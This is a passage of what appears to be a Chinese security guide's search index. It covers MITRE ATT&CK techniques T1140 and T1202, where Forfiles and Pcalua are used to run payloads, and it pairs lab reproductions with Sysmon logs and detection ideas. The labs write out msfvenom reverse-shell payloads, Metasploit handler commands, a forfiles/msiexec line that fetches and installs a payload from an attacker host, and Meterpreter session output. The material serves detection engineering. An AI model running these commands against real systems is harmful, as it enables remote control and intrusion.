(EventCode=1 Image=\u201d*\\\\certutil.exe\u201d CommandLine IN (\u201c*encode*\u201d , \u201c*decode*\u201d))\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1140</p> <p>https://attack.mitre.org/techniques/T1140</p> <p>CMD \u4e2dcertutil \u64cd\u4f5c\u547d\u4ee4</p> <p>https://www.cnblogs.com/zeng-qh/p/10608522.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Forfiles\u4e3aWindows\u9ed8\u8ba4\u5b89\u88c5\u7684\u6587\u4ef6\u64cd\u4f5c\u641c\u7d22\u5de5\u5177\u4e4b\u4e00\uff0c\u53ef\u6839\u636e\u65e5\u671f\uff0c\u540e\u7f00\u540d\uff0c\u4fee\u6539\u65e5\u671f\u4e3a\u6761\u4ef6\u3002\u5e38\u4e0e\u6279\u5904\u7406\u914d\u5408\u4f7f\u7528\u3002</p> <p>\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)</p> <p>\u8bf4\u660e\uff1aForfiles.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cForfiles\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Forfiles\u8c03\u7528\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\WINDOWS\\system32\\forfiles.exe C:\\WINDOWS\\SysWOW64\\forfiles.exe</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u751f\u6210payload","text":"<pre><code>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=8888 -f msi &gt; abc.txt\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#msf","title":"MSF\u914d\u7f6e","text":"<pre><code>msf5 exploit(multi/handler) &gt; back\nmsf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 8888\nlport =&gt; 5555\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#payload_1","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>forfiles /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i http://192.168.126.146/abc.txt\"\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<p>\u53cd\u5f39shell\u5931\u8d25\uff01\uff01\uff01\u4f46\u4e0d\u5f71\u54cd\u540e\u7eed\u5206\u6790</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>#sysmon\u65e5\u5fd7\nEventID\uff1a1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16:27:08.447\nProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}\nProcessId: 588\nImage: C:\\Windows\\System32\\msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows\u00ae installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: /q /i http://192.168.126.146/abc.txt\nCurrentDirectory: C:\\Windows\\system32\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}\nLogonId: 0x66db8\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}\nParentProcessId: 1220\nParentImage: C:\\Windows\\System32\\forfiles.exe\nParentCommandLine: forfiles  /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i http://192.168.126.146/abc.txt\"\n\n\n#win7\u5b89\u5168\u65e5\u5fd7\nEventID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x4c4\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\forfiles.exe\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1202</p> <p>https://attack.mitre.org/techniques/T1202/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload</p> <p>https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Pcalua\u6267\u884cpayload","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Windows\u8fdb\u7a0b\u517c\u5bb9\u6027\u52a9\u7406(Program Compatibility Assistant)\u7684\u4e00\u4e2a\u7ec4\u4ef6\u3002</p> <p>\u8bf4\u660e\uff1aPcalua.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cPcalua\u547d\u4ee4\u53ef\u8bc6\u522b</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\pcalua.exe</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u751f\u6210payload","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=6666 -f exe &gt; shell.exe\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#msf","title":"MSF\u914d\u7f6e","text":"<pre><code>msf5 exploit(multi/handler) &gt; back\nmsf5 &gt; use exploit/multi/handler\nmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 5555\nlport =&gt; 5555\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#payload_1","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>Pcalua -m -a \\\\192.168.1.119\\share\\shell.exe #\u53ef\u8fdc\u7a0b\u52a0\u8f7d\n\nPcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe #\u53ef\u672c\u5730\u52a0\u8f7d\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>Msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:6666\n[*] Sending stage (180291 bytes) to 192.168.126.149\n[*] Meterpreter session 4 opened (192.168.126.146:6666 -&gt; 192.168.126.149:49163) at 2020-04-19 00:12:39 +0800\n\nmeterpreter &gt; getuid\nServer username: 12306Br0-PC\\12306Br0\nmeterpreter &gt; getpid\nCurrent pid: 2804\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>#sysmon\u65e5\u5fd7\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16:12:37.744\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nProcessId: 2148\nImage: C:\\Windows\\System32\\pcalua.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Program Compatibility Assistant\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName:\nCommandLine: Pcalua  -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\nCurrentDirectory: C:\\Users\\12306Br0\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=280038828C2412F3867DDB22E07759CB26F7D8EA\nParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}\nParentProcessId: 2724\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"\n\nEventID: 1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 16:12:37.775\nProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}\nProcessId: 2804\nImage: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\nFileVersion: 2.2.14\nDescription: ApacheBench command line utility\nProduct: Apache HTTP Server\nCompany: Apache Software Foundation\nOriginalFileName: ab.exe\nCommandLine: \"C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\"\nCurrentDirectory: C:\\Users\\12306Br0\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\nLogonId: 0x66ddb\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C\nParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\nParentProcessId: 2148\nParentImage: C:\\Windows\\System32\\pcalua.exe\nParentCommandLine: Pcalua  -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\n\n#win7\u5b89\u5168\u65e5\u5fd7\nEventID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x864\n\u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\pcalua.exe\n\nEventID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0xaf4\n\u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\n\nEventID\uff1a5156\n\u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f:\n\u8fdb\u7a0b ID: 2804\n\u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\shell.exe\n\n\u7f51\u7edc\u4fe1\u606f:\n\u65b9\u5411: \u51fa\u7ad9\n\u6e90\u5730\u5740: 192.168.126.149\n\u6e90\u7aef\u53e3: 49163\n\u76ee\u6807\u5730\u5740: 192.168.126.146\n\u76ee\u6807\u7aef\u53e3: 6666\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1202</p> <p>https://attack.mitre.org/techniques/T1202/</p> <p>\u6e17\u900f\u6d4b\u8bd5-\u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload--Pcalua</p> <p>https://blog.csdn.net/qq_17204441/article/details/89881795</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/","title":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528control.exe\u4ee3\u7406\u6076\u610f\u8d1f\u8f7d\u7684\u6267\u884c\u3002 Windows\u201c\u63a7\u5236\u9762\u677f\u201d\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u5904\u7406\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u7684\u6267\u884c\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u662f\u4f7f\u7528\u6237\u53ef\u4ee5\u67e5\u770b\u548c\u8c03\u6574\u8ba1\u7b97\u673a\u8bbe\u7f6e\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002</p> 